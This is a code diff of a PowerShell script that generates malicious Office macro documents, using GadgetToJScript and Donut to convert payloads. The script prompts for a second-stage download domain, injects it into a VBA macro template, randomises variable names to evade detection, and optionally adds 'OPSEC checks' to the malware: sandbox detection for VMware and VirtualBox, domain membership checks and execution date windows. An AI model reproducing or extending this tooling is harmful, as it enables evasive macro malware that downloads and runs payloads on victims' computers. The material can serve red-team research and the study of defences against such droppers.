@@ -40,35 +40,31 @@ $NewLine = "`n"
 
 Function InstallationChecks{
 
-    $CheckGadGet = Test-Path .\Converters\GadgetToJScript.exe
-    If ($CheckGadGet -eq $True)
+    If ((Test-Path .\Converters\GadgetToJScript.exe) -eq $True -and (Test-Path .\Converters\Donut.exe) -eq $True )
     {
         Init
-    }
-    
+    } 
     Else
     {
         Write-Host "[+] It's the first time you've running this project" -ForegroundColor Green
-        Write-Host "[+] Please compile the GadgetToJScript solution from the ""Third Party Projects"" folder." -ForegroundColor Green
-
-    }
-    $CheckDonut = Test-Path .\Converters\Donut.exe
-    If ($CheckDonut -eq $True)
-    {
-        Init
-    }
-    
-    Else
-    {
-        Write-Host "[+] Please compile the Donut solution from the ""Third Party Projects"" folder." -ForegroundColor Green
-
+        Write-Host "[+] Please compile the GadgetToJScript & Donut solution from the ""Third Party Projects"" folder." -ForegroundColor Gree
     }
     
 }
 
 Function OpsecOptions(){
 
-    $DomainName = Read-Host "[+] Insert the Active Directory domain name"
+    If (($checkdomain = Read-Host "[+] Would you like to check if is the computer part of a domain? Type Yes or No") -eq "Yes" )  {
+        $DomainName = Read-Host "[+] Insert the Active Directory domain name"
+    }
+
+    ElseIf ($checkdomain -eq "No"){}
+    
+    Else {
+        Write-Host "[+] Wrong option" -ForegroundColor DarkGreen
+        OpsecOptions
+    }
+    
     $firstdate = Read-Host "[+] Insert the beginning date (mm/dd/yyyy) to malware execution"
     $lastdate = Read-Host "[+] Insert the last date (mm/dd/yyyy) to malware execution"
 
@@ -82,7 +78,7 @@ Function OpsecOptions(){
 
 Function CreateDoc(){
 
-    $link = $(Read-Host "[+] Insert the domain name for second stage download")
+    $link = $(Read-Host "[+] Insert the domain addr for second stage download")
     
     function ascii_to_dec($s){
 
@@ -120,18 +116,11 @@ Function CreateDoc(){
 
     $MacroCode = Get-Content ".\test.vba" | Out-String
 
-    $MacroCode = $MacroCode -replace 'download', $back 
-
-    $MacroCode = $MacroCode -replace 'hahaha', $link
-
-    $MacroCode = $MacroCode -replace 'randomvar', $randomvar
-
+    $MacroCode = $MacroCode -replace 'download', $back -replace 'hahaha', $link -replace 'randomvar', $randomvar
     
     If ($opsec -eq "Yes"){
 
-
         $MacroCode += $opsec_checks
-    
     }
 
     Else {
@@ -144,13 +133,11 @@ Function CreateDoc(){
         $Macrocode += "End Sub" + $NewLine
     }
 
-
     Function GetRamdomString($rsize){
 
         $b = -join ((65..90) + (97..122) | Get-Random -Count $rsize | % {[char]$_})
         $b
     }
-
 
     $vars = @("hexDecode","xmlObj", "nodeObj", "http", "tywin", "Backflip", "tyrion", "ObjStream", "manifesto", "stm_1", "stm_2", "fmt_1", "Decstage_1", "Decstage_2", "stage1", "stage2", "cxp1", "cxp2", "cxn", "paf", "path_1", "tt1", "tt2", "tt3", "tt4", "tt5", "UserProfile", "VmWareFileName", "VBoxFileName", "strDomain", "wshNetwork", "VmWareFileExists", "VBoxFileExists", "str_dateMin", "str_dateMax", "dateMin", "dateMax", "todayDate")
 
@@ -348,7 +335,6 @@ Function Donut(){
     Remove-Item ".\payload.bin"
 
     CreateDoc
-
 }
 
 Function Deploy(){
@@ -371,11 +357,9 @@ Function Deploy(){
 }
 
 Function Init{
-
-    
+   
     $opsec = $(Read-Host "[+] Do you want to add OPSEC checks to you malware? Type Yes or No")
     
-
     if ($opsec -eq "Yes")
     {
         OpsecOptions
